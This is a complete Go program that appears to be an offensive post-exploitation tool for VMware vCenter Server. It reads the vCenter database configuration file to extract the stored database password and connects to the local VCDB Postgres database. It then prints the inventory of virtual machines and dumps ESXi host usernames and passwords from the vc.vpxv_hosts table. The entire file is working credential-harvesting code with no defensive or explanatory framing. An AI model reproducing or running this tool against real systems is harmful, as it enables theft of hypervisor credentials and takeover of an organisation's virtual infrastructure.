package main

import (
	"database/sql"
	"fmt"
	"strings"
	"io/ioutil"
	_ "github.com/lib/pq"
)


func connectDB() *sql.DB{
	fmt.Println("[+] Get the config")
	b, err := ioutil.ReadFile("/etc/vmware-vpx/vcdb.properties")
    if err != nil {
        fmt.Print(err)
    }

	str := string(b)
	fmt.Println(str)
	index1 := strings.Index(str,"password")
	index2 := strings.Index(str,"password.encrypted")
	password := b[index1+11:index2]

	var host     = "localhost"
	var port int = 5432
	var user     = "vc"
	var dbname   = "VCDB"

	psqlInfo := fmt.Sprintf("host=%s port=%d user=%s "+
		"password=%s dbname=%s sslmode=disable",
		host, port, user, password, dbname)

	fmt.Println("[*] psqlInfo:" + psqlInfo)
	db, err := sql.Open("postgres", psqlInfo)
	if err != nil {
		panic(err)
	}

	err = db.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Successfully connected!")
	return db
}


func queryVM(db *sql.DB){
	var file_name,guest_os,ip_address,power_state string

	fmt.Println("[*] Querying VM")
	rows,err:=db.Query("SELECT file_name,guest_os,ip_address,power_state FROM vc.vpx_vm")

	if err!= nil{
		panic(err)
	}
	defer rows.Close()
	for rows.Next(){
		err:= rows.Scan(&file_name,&guest_os,&ip_address,&power_state)
		if err!= nil{
			//fmt.Println(err)
		}
		fmt.Println(" - file_name   : " + file_name)
		fmt.Println("   guest_os    : " + guest_os)
		fmt.Println("   ip_address  : " + ip_address)
		fmt.Println("   power_state : " + power_state)
	}
	err = rows.Err()
	if err!= nil{
		panic(err)
	}
}


func queryESXI(db *sql.DB){
	var name,username,password,password_last_upd_dt string

	fmt.Println("[*] Querying ESXI")
	rows,err:=db.Query("SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts")

	if err!= nil{
		panic(err)
	}
	defer rows.Close()
	for rows.Next(){
		err:= rows.Scan(&name,&username,&password,&password_last_upd_dt)
		if err!= nil{
			//fmt.Println(err)
		}
		fmt.Println(" - name         : " + name)
		fmt.Println("   username     : " + username)
		fmt.Println("   password     : " + password)
		fmt.Println("   password_last: " + password_last_upd_dt)

	}
	err = rows.Err()
	if err!= nil{
		panic(err)
	}
}


func main()  {
	db:=connectDB()
	queryVM(db)
	queryESXI(db)
}